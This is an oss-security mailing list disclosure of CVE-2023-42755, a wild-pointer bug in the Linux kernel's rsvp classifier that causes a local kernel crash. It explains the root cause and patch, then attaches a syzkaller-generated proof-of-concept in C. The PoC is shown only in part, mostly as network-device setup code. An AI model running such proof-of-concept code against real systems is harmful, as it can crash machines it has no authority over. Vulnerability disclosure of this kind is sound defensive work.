Received: (qmail 3966 invoked by uid 550); 25 Sep 2023 21:26:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24192 invoked from network); 25 Sep 2023 20:13:35 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1695672802; x=1696277602; darn=lists.openwall.com;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :from:to:cc:subject:date:message-id:reply-to;
        bh=sDp13o5fKJImGa8kmFmqY43nZRLJmM423F0haMqC5Rg=;
        b=gjLJoY4/d6cqbUU4aSIOAesQtGzcye46zloy2LSrHzVyqLzLI4kP5/1DCC0n0wUcRs
         jNPe37ZEMHWBDhnUjDUV5/dMNKJ1MbkBy1jnFebFz5LBF42sxjsUL14HMe0ZpJNfJS3z
         MpKIh6l/pgNfEUzq4sxzQ4nBVxGPtJ7eMC9jupok364xTpf0mCq3nStyRfzwbVljAox1
         hpGfS3w/fkfcfs7wamr/r6vY8HnhgW4HxNsQJLIH1aI4Pqs7GQTxLlyzT5ij4leSkjQz
         TXyGrK9rmBG0voUDUcpaw0q3kYeuRfYihD7fb3qbV/+9aHix+tCqpwt++lOIucbXEWMA
         hH4A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1695672802; x=1696277602;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=sDp13o5fKJImGa8kmFmqY43nZRLJmM423F0haMqC5Rg=;
        b=fAY6MjehvfZuj1m2fS8n79H38cW67IAir4e4/MP8/h3SbBYyJ9xAZSXt8ktg2LTzO8
         FeWiC3hE+HWXcZgHyeG1kNai5q96dUH986Yh0aiRcJ++MzpJF8wGiRi2vlyDL9vY85V8
         FZXfEE90BpcPYI6Kr7pwxlCKqmN0hrg4BNHZgw5as0A8miCjJGYLH3notR0muE7Y8b2u
         NMt5UL4UCWTdRgOjZ2afWhBWY8B6BDLK9aGYATZ2jAGJ/XSQv74MRAL80ZgWvL3oESG3
         Qy4W9HQCVcTU1Utab7A0U6TAuUdcOczxWEFuvQ/aDzaLkkLfyYqUFJpGwjHktGztZOaj
         Ud3g==
X-Gm-Message-State: AOJu0Yzu39xOrEjEQSNXTM0egG8tR4CKw88/2QoK7CtzxaZam1l2t4b6
	5jFhynhvv1cP3H3acNmS+ccFK7owayM=
X-Google-Smtp-Source: AGHT+IFKsX/COoIamsc6X8iLnxhdM7FDIF9Zt+QXOoE7hXFA3qdNQ7OhCk/y7tWZO/R55Pe++X1VcA==
X-Received: by 2002:a17:903:491:b0:1c3:61d9:2b32 with SMTP id jj17-20020a170903049100b001c361d92b32mr5423509plb.45.1695672802444;
        Mon, 25 Sep 2023 13:13:22 -0700 (PDT)
Date: Mon, 25 Sep 2023 13:13:19 -0700
From: Kyle Zeng <zengyhkyle@gmail.com>
To: oss-security@lists.openwall.com
Message-ID: <ZRHp39Aa3dOf1y/O@westworld>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="iA4TYvMiMBL2XF7A"
Content-Disposition: inline
Subject: [oss-security] [CVE-2023-42755] Linux kernel wild pointer access <= v6.2

--iA4TYvMiMBL2XF7A
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi there,

I recently found a bug in the rsvp traffic classifier in the Linux kernel.
This classifier is already retired in the upstream but affects all stable
releases. More specifically, this bug affects v6.1, v5.15, v5.10, v5.4,
v4.19, and v4.14.

The symptom of the bug is that the kernel can be tricked into accessing a
wild pointer, thus crash the kernel.

[Root Cause]
The root cause of the bug is an slab-out-of-bound access, but since the
offset to the original pointer is an `unsigned int` fully controlled by
users, the behaviour is ususally a wild pointer access.

in `rsvp_change`, RSVP_PINFO is passed to the kernel without any checks
~~~
static int rsvp_change(...)
{
        ......
        if (tb[TCA_RSVP_PINFO]) {
                pinfo = nla_data(tb[TCA_RSVP_PINFO]);
                f->spi = pinfo->spi;
                f->tunnelhdr = pinfo->tunnelhdr;
        }
        ......
        if (pinfo) {
                s->dpi = pinfo->dpi;
                s->protocol = pinfo->protocol;
                s->tunnelid = pinfo->tunnelid;
        }
        ......
}
~~~

As a result, later when the classifier actually does the classification
in `rsvp_classify`:
~~~
TC_INDIRECT_SCOPE int RSVP_CLS(struct sk_buff *skb, const struct tcf_proto *tp,
                               struct tcf_result *res)
{
        ......
        *(u32 *)(xprt + s->dpi.offset) ^ s->dpi.key)
        ......
}
~~~
`xprt + s->dpi.offset` becomes a wild pointer and crashes the kernel.

[Severity]
This will cause a local denial-of-service.

[Patch]
The patch is to follow the upstream and retire the rsvp classifier in
all the stable trees.
And it is queued in all the stable trees, but not merged yet.
For example, the patch for v6.1 can be found here:
https://git.kernel.org/pub/scm/linux/kernel/git/stable/stable-queue.git/diff/queue-6.1/net-sched-retire-rsvp-classifier.patch?id=f75b6fc19b6ec061f59b4e18d72ebb32ceea8587

[Affected Version]
I confirmed that this bug affects v6.2, v6.1, v5.15, v5.10, v5.4,
v4.19, and v4.14.

[Proof-of-Concept]
A PoC file is attached to this email.

[Splash]
A kernel oops splash is attached to this email.

This issue is assigned with CVE-2023-42755.

Best,
Kyle Zeng

--iA4TYvMiMBL2XF7A
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="poc.c"

// autogenerated by syzkaller (https://github.com/google/syzkaller)

#define _GNU_SOURCE 

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/veth.h>

static unsigned long long procid;

#define BITMASK(bf_off,bf_len) (((1ull << (bf_len)) - 1) << (bf_off))
#define STORE_BY_BITMASK(type,htobe,addr,val,bf_off,bf_len) *(type*)(addr) = htobe((htobe(*(type*)(addr)) & ~BITMASK((bf_off), (bf_len))) | (((type)(val) << (bf_off)) & BITMASK((bf_off), (bf_len))))

struct csum_inet {
	uint32_t acc;
};

static void csum_inet_init(struct csum_inet* csum)
{
	csum->acc = 0;
}

static void csum_inet_update(struct csum_inet* csum, const uint8_t* data, size_t length)
{
	if (length == 0)
		return;
	size_t i = 0;
	for (; i < length - 1; i += 2)
		csum->acc += *(uint16_t*)&data[i];
	if (length & 1)
		csum->acc += le16toh((uint16_t)data[length - 1]);
	while (csum->acc > 0xffff)
		csum->acc = (csum->acc & 0xffff) + (csum->acc >> 16);
}

static uint16_t csum_inet_digest(struct csum_inet* csum)
{
	return ~csum->acc;
}

static bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);
	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		int err = errno;
		close(fd);
		errno = err;
		return false;
	}
	close(fd);
	return true;
}

struct nlmsg {
	char* pos;
	int nesting;
	struct nlattr* nested[8];
	char buf[4096];
};

static void netlink_init(struct nlmsg* nlmsg, int typ, int flags,
			 const void* data, int size)
{
	memset(nlmsg, 0, sizeof(*nlmsg));
	struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
	hdr->nlmsg_type = typ;
	hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
	memcpy(hdr + 1, data, size);
	nlmsg->pos = (char*)(hdr + 1) + NLMSG_ALIGN(size);
}

static void netlink_attr(struct nlmsg* nlmsg, int typ,
			 const void* data, int size)
{
	struct nlattr* attr = (struct nlattr*)nlmsg->pos;
	attr->nla_len = sizeof(*attr) + size;
	attr->nla_type = typ;
	if (size > 0)
		memcpy(attr + 1, data, size);
	nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
}

static void netlink_nest(struct nlmsg* nlmsg, int typ)
{
	struct nlattr* attr = (struct nlattr*)nlmsg->pos;
	attr->nla_type = typ;
	nlmsg->pos += sizeof(*attr);
	nlmsg->nested[nlmsg->nesting++] = attr;
}

static void netlink_done(struct nlmsg* nlmsg)
{
	struct nlattr* attr = nlmsg->nested[--nlmsg->nesting];
	attr->nla_len = nlmsg->pos - (char*)attr;
}

static int netlink_send_ext(struct nlmsg* nlmsg, int sock,
			    uint16_t reply_type, int* reply_len, bool dofail)
{
	if (nlmsg->pos > nlmsg->buf + sizeof(nlmsg->buf) || nlmsg->nesting)
	exit(1);
	struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
	hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;
	struct sockaddr_nl addr;
	memset(&addr, 0, sizeof(addr));
	addr.nl_family = AF_NETLINK;
	ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0, (struct sockaddr*)&addr, sizeof(addr));
	if (n != (ssize_t)hdr->nlmsg_len) {
		if (dofail)
	exit(1);
		return -1;
	}
	n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
	if (reply_len)
		*reply_len = 0;
	if (n < 0) {
		if (dofail)
	exit(1);
		return -1;
	}
	if (n < (ssize_t)sizeof(struct nlmsghdr)) {
		errno = EINVAL;
		if (dofail)
	exit(1);
		return -1;
	}
	if (hdr->nlmsg_type == NLMSG_DONE)
		return 0;
	if (reply_len && hdr->nlmsg_type == reply_type) {
		*reply_len = n;
		return 0;
	}
	if (n < (ssize_t)(sizeof(struct nlmsghdr) + sizeof(struct nlmsgerr))) {
		errno = EINVAL;
		if (dofail)
	exit(1);
		return -1;
	}
	if (hdr->nlmsg_type != NLMSG_ERROR) {
		errno = EINVAL;
		if (dofail)
	exit(1);
		return -1;
	}
	errno = -((struct nlmsgerr*)(hdr + 1))->error;
	return -errno;
}

static int netlink_send(struct nlmsg* nlmsg, int sock)
{
	return netlink_send_ext(nlmsg, sock, 0, NULL, true);
}

static int netlink_query_family_id(struct nlmsg* nlmsg, int sock, const char* family_name, bool dofail)
{
	struct genlmsghdr genlhdr;
	memset(&genlhdr, 0, sizeof(genlhdr));
	genlhdr.cmd = CTRL_CMD_GETFAMILY;
	netlink_init(nlmsg, GENL_ID_CTRL, 0, &genlhdr, sizeof(genlhdr));
	netlink_attr(nlmsg, CTRL_ATTR_FAMILY_NAME, family_name, strnlen(family_name, GENL_NAMSIZ - 1) + 1);
	int n = 0;
	int err = netlink_send_ext(nlmsg, sock, GENL_ID_CTRL, &n, dofail);
	if (err < 0) {
		return -1;
	}
	uint16_t id = 0;
	struct nlattr* attr = (struct nlattr*)(nlmsg->buf + NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(genlhdr)));
	for (; (char*)attr < nlmsg->buf + n; attr = (struct nlattr*)((char*)attr + NLMSG_ALIGN(attr->nla_len))) {
		if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
			id = *(uint16_t*)(attr + 1);
			break;
		}
	}
	if (!id) {
		errno = EINVAL;
		return -1;
	}
	recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
	return id;
}

static int netlink_next_msg(struct nlmsg* nlmsg, unsigned int offset,
			    unsigned int total_len)
{
	struct nlmsghdr* hdr = (struct nlmsghdr*)(nlmsg->buf + offset);
	if (offset == total_len || offset + hdr->nlmsg_len > total_len)
		return -1;
	return hdr->nlmsg_len;
}

static void netlink_add_device_impl(struct nlmsg* nlmsg, const char* type,
				    const char* name, bool up)
{
	struct ifinfomsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	if (up)
		hdr.ifi_flags = hdr.ifi_change = IFF_UP;
	netlink_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
	if (name)
		netlink_attr(nlmsg, IFLA_IFNAME, name, strlen(name));
	netlink_nest(nlmsg, IFLA_LINKINFO);
	netlink_attr(nlmsg, IFLA_INFO_KIND, type, strlen(type));
}

static void netlink_add_device(struct nlmsg* nlmsg, int sock, const char* type,
			       const char* name)
{
	netlink_add_device_impl(nlmsg, type, name, false);
	netlink_done(nlmsg);
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static void netlink_add_veth(struct nlmsg* nlmsg, int sock, const char* name,
			     const char* peer)
{
	netlink_add_device_impl(nlmsg, "veth", name, false);
	netlink_nest(nlmsg, IFLA_INFO_DATA);
	netlink_nest(nlmsg, VETH_INFO_PEER);
	nlmsg->pos += sizeof(struct ifinfomsg);
	netlink_attr(nlmsg, IFLA_IFNAME, peer, strlen(peer));
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static void netlink_add_xfrm(struct nlmsg* nlmsg, int sock, const char* name)
{
	netlink_add_device_impl(nlmsg, "xfrm", name, true);
	netlink_nest(nlmsg, IFLA_INFO_DATA);
	int if_id = 1;
	netlink_attr(nlmsg, 2, &if_id, sizeof(if_id));
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static void netlink_add_hsr(struct nlmsg* nlmsg, int sock, const char* name,
			    const char* slave1, const char* slave2)
{
	netlink_add_device_impl(nlmsg, "hsr", name, false);
	netlink_nest(nlmsg, IFLA_INFO_DATA);
	int ifindex1 = if_nametoindex(slave1);
	netlink_attr(nlmsg, IFLA_HSR_SLAVE1, &ifindex1, sizeof(ifindex1));
	int ifindex2 = if_nametoindex(slave2);
	netlink_attr(nlmsg, IFLA_HSR_SLAVE2, &ifindex2, sizeof(ifindex2));
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static void netlink_add_linked(struct nlmsg* nlmsg, int sock, const char* type, const char* name, const char* link)
{
	netlink_add_device_impl(nlmsg, type, name, false);
	netlink_done(nlmsg);
	int ifindex = if_nametoindex(link);
	netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static void netlink_add_vlan(struct nlmsg* nlmsg, int sock, const char* name, const char* link, uint16_t id, uint16_t proto)
{
	netlink_add_device_impl(nlmsg, "vlan", name, false);
	netlink_nest(nlmsg, IFLA_INFO_DATA);
	netlink_attr(nlmsg, IFLA_VLAN_ID, &id, sizeof(id));
	netlink_attr(nlmsg, IFLA_VLAN_PROTOCOL, &proto, sizeof(proto));
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	int ifindex = if_nametoindex(link);
	netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static void netlink_add_macvlan(struct nlmsg* nlmsg, int sock, const char* name, const char* link)
{
	netlink_add_device_impl(nlmsg, "macvlan", name, false);
	netlink_nest(nlmsg, IFLA_INFO_DATA);
	uint32_t mode = MACVLAN_MODE_BRIDGE;
	netlink_attr(nlmsg, IFLA_MACVLAN_MODE, &mode, sizeof(mode));
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	int ifindex = if_nametoindex(link);
	netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static void netlink_add_geneve(struct nlmsg* nlmsg, int sock, const char* name, uint32_t vni, struct in_addr* addr4, struct in6_addr* addr6)
{
	netlink_add_device_impl(nlmsg, "geneve", name, false);
	netlink_nest(nlmsg, IFLA_INFO_DATA);
	netlink_attr(nlmsg, IFLA_GENEVE_ID, &vni, sizeof(vni));
	if (addr4)
		netlink_attr(nlmsg, IFLA_GENEVE_REMOTE, addr4, sizeof(*addr4));
	if (addr6)
		netlink_attr(nlmsg, IFLA_GENEVE_REMOTE6, addr6, sizeof(*addr6));
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

#define IFLA_IPVLAN_FLAGS 2
#define IPVLAN_MODE_L3S 2
#undef IPVLAN_F_VEPA
#define IPVLAN_F_VEPA 2

static void netlink_add_ipvlan(struct nlmsg* nlmsg, int sock, const char* name, const char* link, uint16_t mode, uint16_t flags)
{
	netlink_add_device_impl(nlmsg, "ipvlan", name, false);
	netlink_nest(nlmsg, IFLA_INFO_DATA);
	netlink_attr(nlmsg, IFLA_IPVLAN_MODE, &mode, sizeof(mode));
	netlink_attr(nlmsg, IFLA_IPVLAN_FLAGS, &flags, sizeof(flags));
	netlink_done(nlmsg);
	netlink_done(nlmsg);
	int ifindex = if_nametoindex(link);
	netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static void netlink_device_change(struct nlmsg* nlmsg, int sock, const char* name, bool up,
				  const char* master, const void* mac, int macsize,
				  const char* new_name)
{
	struct ifinfomsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	if (up)
		hdr.ifi_flags = hdr.ifi_change = IFF_UP;
	hdr.ifi_index = if_nametoindex(name);
	netlink_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
	if (new_name)
		netlink_attr(nlmsg, IFLA_IFNAME, new_name, strlen(new_name));
	if (master) {
		int ifindex = if_nametoindex(master);
		netlink_attr(nlmsg, IFLA_MASTER, &ifindex, sizeof(ifindex));
	}
	if (macsize)
		netlink_attr(nlmsg, IFLA_ADDRESS, mac, macsize);
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static int netlink_add_addr(struct nlmsg* nlmsg, int sock, const char* dev,
			    const void* addr, int addrsize)
{
	struct ifaddrmsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	hdr.ifa_family = addrsize == 4 ? AF_INET : AF_INET6;
	hdr.ifa_prefixlen = addrsize == 4 ? 24 : 120;
	hdr.ifa_scope = RT_SCOPE_UNIVERSE;
	hdr.ifa_index = if_nametoindex(dev);
	netlink_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
	netlink_attr(nlmsg, IFA_LOCAL, addr, addrsize);
	netlink_attr(nlmsg, IFA_ADDRESS, addr, addrsize);
	return netlink_send(nlmsg, sock);
}

static void netlink_add_addr4(struct nlmsg* nlmsg, int sock,
			      const char* dev, const char* addr)
{
	struct in_addr in_addr;
	inet_pton(AF_INET, addr, &in_addr);
	int err = netlink_add_addr(nlmsg, sock, dev, &in_addr, sizeof(in_addr));
	if (err < 0) {
	}
}

static void netlink_add_addr6(struct nlmsg* nlmsg, int sock,
			      const char* dev, const char* addr)
{
	struct in6_addr in6_addr;
	inet_pton(AF_INET6, addr, &in6_addr);
	int err = netlink_add_addr(nlmsg, sock, dev, &in6_addr, sizeof(in6_addr));
	if (err < 0) {
	}
}

static void netlink_add_neigh(struct nlmsg* nlmsg, int sock, const char* name,
			      const void* addr, int addrsize, const void* mac, int macsize)
{
	struct ndmsg hdr;
	memset(&hdr, 0, sizeof(hdr));
	hdr.ndm_family = addrsize == 4 ? AF_INET : AF_INET6;
	hdr.ndm_ifindex = if_nametoindex(name);
	hdr.ndm_state = NUD_PERMANENT;
	netlink_init(nlmsg, RTM_NEWNEIGH, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
	netlink_attr(nlmsg, NDA_DST, addr, addrsize);
	netlink_attr(nlmsg, NDA_LLADDR, mac, macsize);
	int err = netlink_send(nlmsg, sock);
	if (err < 0) {
	}
}

static struct nlmsg nlmsg;

static int tunfd = -1;

#define TUN_IFACE "syz_tun"
#define LOCAL_MAC 0xaaaaaaaaaaaa
#define REMOTE_MAC 0xaaaaaaaaaabb
#define LOCAL_IPV4 "172.20.20.170"
#define REMOTE_IPV4 "172.20.20.187"
#define LOCAL_IPV6 "fe80::aa"
#define REMOTE_IPV6 "fe80::bb"

#define IFF_NAPI 0x0010

static void initialize_tun(void)
{
	tunfd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
	if (tunfd == -1) {
		printf("tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\n");
		printf("otherwise fuzzing or reproducing might not work as intended\n");
		return;
	}
	const int kTunFd = 200;
	if (dup2(tunfd, kTunFd) < 0)
	exit(1);
	close(tunfd);
	tunfd = kTunFd;
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
	if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {
	exit(1);
	}
	char sysctl[64];
	sprintf(sysctl, "/proc/sys/net/ipv6/conf/%s/accept_dad", TUN_IFACE);
	write_file(sysctl, "0");
	sprintf(sysctl, "/proc/sys/net/ipv6/conf/%s/router_solicitations", TUN_IFACE);
	write_file(sysctl, "0");
	int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (sock == -1)
	exit(1);
	netlink_add_addr4(&nlmsg, sock, TUN_IFACE, LOCAL_IPV4);
	netlink_add_addr6(&nlmsg, sock, TUN_IFACE, LOCAL_IPV6);
	uint64_t macaddr = REMOTE_MAC;
	struct in_addr in_addr;
	inet_pton(AF_INET, REMOTE_IPV4, &in_addr);
	netlink_add_neigh(&nlmsg, sock, TUN_IFACE, &in_addr, sizeof(in_addr), &macaddr, ETH_ALEN);
	struct in6_addr in6_addr;
	inet_pton(AF_INET6, REMOTE_IPV6, &in6_addr);
	netlink_add_neigh(&nlmsg, sock, TUN_IFACE, &in6_addr, sizeof(in6_addr), &macaddr, ETH_ALEN);
	macaddr = LOCAL_MAC;
	netlink_device_change(&nlmsg, sock, TUN_IFACE, true, 0, &macaddr, ETH_ALEN, NULL);
	close(sock);
}

#define DEVLINK_FAMILY_NAME "devlink"

#define DEVLINK_CMD_PORT_GET 5
#define DEVLINK_ATTR_BUS_NAME 1
#define DEVLINK_ATTR_DEV_NAME 2
#define DEVLINK_ATTR_NETDEV_NAME 7

static struct nlmsg nlmsg2;

static void initialize_devlink_ports(const char* bus_name, const char* dev_name,
				     const char* netdev_prefix)
{
	struct genlmsghdr genlhdr;
	int len, total_len, id, err, offset;
	uint16_t netdev_index;
	int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (sock == -1)
	exit(1);
	int rtsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (rtsock == -1)
	exit(1);
	id = netlink_query_family_id(&nlmsg, sock, DEVLINK_FAMILY_NAME, true);
	if (id == -1)
		goto error;
	memset(&genlhdr, 0, sizeof(genlhdr));
	genlhdr.cmd = DEVLINK_CMD_PORT_GET;
	netlink_init(&nlmsg, id, NLM_F_DUMP, &genlhdr, sizeof(genlhdr));
	netlink_attr(&nlmsg, DEVLINK_ATTR_BUS_NAME, bus_name, strlen(bus_name) + 1);
	netlink_attr(&nlmsg, DEVLINK_ATTR_DEV_NAME, dev_name, strlen(dev_name) + 1);
	err = netlink_send_ext(&nlmsg, sock, id, &total_len, true);
	if (err < 0) {
		goto error;
	}
	offset = 0;
	netdev_index = 0;
	while ((len = netlink_next_msg(&nlmsg, offset, total_len)) != -1) {
		struct nlattr* attr = (struct nlattr*)(nlmsg.buf + offset + NLMSG_HDRLEN + NLMSG_ALIGN(sizeof(genlhdr)));
		for (; (char*)attr < nlmsg.buf + offset + len; attr = (struct nlattr*)((char*)attr + NLMSG_ALIGN(attr->nla_len))) {
			if (attr->nla_type == DEVLINK_ATTR_NETDEV_NAME) {
				char* port_name;
				char netdev_name[IFNAMSIZ];
				port_name = (char*)(attr + 1);
				snprintf(netdev_name, sizeof(netdev_name), "%s%d", netdev_prefix, netdev_index);
				netlink_device_change(&nlmsg2, rtsock, port_name, true, 0, 0, 0, netdev_name);
				break;
			}
		}
		offset += len;
		netdev_index++;
	}
error:
	close(rtsock);
	close(sock);
}

#define DEV_IPV4 "172.20.20.%d"
#define DEV_IPV6 "fe80::%02x"
#define DEV_MAC 0x00aaaaaaaaaa

static void netdevsim_add(unsigned int addr, unsigned int port_count)
{
	write_file("/sys/bus/netdevsim/del_device", "%u", addr);
	if (write_file("/sys/bus/netdevsim/new_device", "%u %u", addr, port_count)) {
		char buf[32];
		snprintf(buf, sizeof(buf), "netdevsim%d", addr);
		initialize_devlink_ports("netdevsim", buf, "netdevsim");
	}
}

static void initialize_netdevices(void)
{
	char netdevsim[16];
	sprintf(netdevsim, "netdevsim%d", (int)procid);
	struct {
		const char* type;
		const char* dev;
	} devtypes[] = {
		{"ip6gretap", "ip6gretap0"},
		{"bridge", "bridge0"},
		{"vcan", "vcan0"},
		{"bond", "bond0"},
		{"team", "team0"},
		{"dummy", "dummy0"},
		{"nlmon", "nlmon0"},
		{"caif", "caif0"},
		{"batadv", "batadv0"},
		{"vxcan", "vxcan1"},
		{"veth", 0},
		{"wireguard", "wg0"},
		{"wireguard", "wg1"},
		{"wireguard", "wg2"},
	};
	const char* devmasters[] = {"bridge", "bond", "team", "batadv"};
	struct {
		const char* name;
		int macsize;
		bool noipv6;
	} devices[] = {
		{"lo", ETH_ALEN},
		{"sit0", 0},
		{"bridge0", ETH_ALEN},
		{"vcan0", 0, true},
		{"tunl0", 0},
		{"gre0", 0},
		{"gretap0", ETH_ALEN},
		{"ip_vti0", 0},
		{"ip6_vti0", 0},
		{"ip6tnl0", 0},
		{"ip6gre0", 0},
		{"ip6gretap0", ETH_ALEN},
		{"erspan0", ETH_ALEN},
		{"bond0", ETH_ALEN},
		{"veth0", ETH_ALEN},
		{"veth1", ETH_ALEN},
		{"team0", ETH_ALEN},
		{"veth0_to_bridge", ETH_ALEN},
		{"veth1_to_bridge", ETH_ALEN},
		{"veth0_to_bond", ETH_ALEN},
		{"veth1_to_bond", ETH_ALEN},
		{"veth0_to_team", ETH_ALEN},
		{"veth1_to_team", ETH_ALEN},
		{"veth0_to_hsr", ETH_ALEN},
		{"veth1_to_hsr", ETH_ALEN},
		{"hsr0", 0},
		{"dummy0", ETH_ALEN},
		{"nlmon0", 0},
		{"vxcan0", 0, true},
		{"vxcan1", 0, true},
		{"caif0", ETH_ALEN},
		{"batadv0", ETH_ALEN},
		{netdevsim, ETH_ALEN},
		{"xfrm0", ETH_ALEN},
		{"veth0_virt_wifi", ETH_ALEN},
		{"veth1_virt_wifi", ETH_ALEN},
		{"virt_wifi0", ETH_ALEN},
		{"veth0_vlan", ETH_ALEN},
		{"veth1_vlan", ETH_ALEN},
		{"vlan0", ETH_ALEN},
		{"vlan1", ETH_ALEN},
		{"macvlan0", ETH_ALEN},
		{"macvlan1", ETH_ALEN},
		{"ipvlan0", ETH_ALEN},
		{"ipvlan1", ETH_ALEN},
		{"veth0_macvtap", ETH_ALEN},
		{"veth1_macvtap", ETH_ALEN},
		{"macvtap0", ETH_ALEN},
		{"macsec0", ETH_ALEN},
		{"veth0_to_batadv", ETH_ALEN},
		{"veth1_to_batadv", ETH_ALEN},
		{"batadv_slave_0", ETH_ALEN},
		{"batadv_slave_1", ETH_ALEN},
		{"geneve0", ETH_ALEN},
		{"geneve1", ETH_ALEN},
		{"wg0", 0},
		{"wg1", 0},
		{"wg2", 0},
	};
	int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (sock == -1)
	exit(1);
	unsigned i;
	for (i = 0; i < sizeof(devtypes) / sizeof(devtypes[0]); i++)
		netlink_add_device(&nlmsg, sock, devtypes[i].type, devtypes[i].dev);
	for (i = 0; i < sizeof(devmasters) / (sizeof(devmasters[0])); i++) {
		char master[32], slave0[32], veth0[32], slave1[32], veth1[32];
		sprintf(slave0, "%s_slave_0", devmasters[i]);
		sprintf(veth0, "veth0_to_%s", devmasters[i]);
		netlink_add_veth(&nlmsg, sock, slave0, veth0);
		sprintf(slave1, "%s_slave_1", devmasters[i]);
		sprintf(veth1, "veth1_to_%s", devmasters[i]);
		netlink_add_veth(&nlmsg, sock, slave1, veth1);
		sprintf(master, "%s0", devmasters[i]);
		netlink_device_change(&nlmsg, sock, slave0, false, master, 0, 0, NULL);
		netlink_device_change(&nlmsg, sock, slave1, false, master, 0, 0, NULL);
	}
	netlink_add_xfrm(&nlmsg, sock, "xfrm0");
	netlink_device_change(&nlmsg, sock, "bridge_slave_0", true, 0, 0, 0, NULL);
	netlink_device_change(&nlmsg, sock, "bridge_slave_1", true, 0, 0, 0, NULL);
	netlink_add_veth(&nlmsg, sock, "hsr_slave_0", "veth0_to_hsr");
	netlink_add_veth(&nlmsg, sock, "hsr_slave_1", "veth1_to_hsr");
	netlink_add_hsr(&nlmsg, sock, "hsr0", "hsr_slave_0", "hsr_slave_1");
